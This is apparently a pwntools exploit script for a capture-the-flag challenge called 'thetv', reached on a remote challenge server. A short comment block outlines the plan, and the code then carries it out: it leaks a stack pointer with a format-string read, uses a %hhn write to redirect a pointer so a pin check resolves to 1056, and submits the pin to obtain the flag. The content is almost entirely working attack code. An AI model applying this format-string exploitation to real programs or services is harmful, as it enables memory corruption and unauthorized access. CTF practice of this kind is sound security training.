'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    exp: fmtstr
1. determine the offset of fmtstr
2. set the ptr_links(6th is 0x420) 3rd to 5th so the ****pin == 1056
3. pass pin checking and get flag
'''

from pwn import *


local = 0
url, port = "0.cloud.chals.io", 30658
filename = "./thetv"
elf = ELF(filename)
# libc = ELF("./libc.so.6") 
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    context.log_level = "debug"
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'>  ', b'p')
    # B()
    payload = b'%12$p'
    io.sendlineafter(b'>  ', payload)
    io.recvuntil(b'You say: ')
    rax_addr_addr = int(io.recvuntil(b'\n', drop=True), 16)
    log.info('rax_addr_addr: ', hex(rax_addr_addr))
    # B()
    # hijack 4th ptr_link to ptr_to1056
    payload = b'%' + str((rax_addr_addr & 0xFF) - 0x10).encode() + b'c%13$hhn'
    io.sendlineafter(b'>  ', b'p')
    io.sendlineafter(b'>  ', payload)

    io.sendlineafter(b'>  ', b'c')
    io.sendlineafter(b'>  ', b'y')
    io.sendlineafter(b'>  ', b'6')
    io.sendlineafter(b'Enter in the pin: ', str(1056).encode())


if __name__ == "__main__":
    pwn()
    io.interactive()
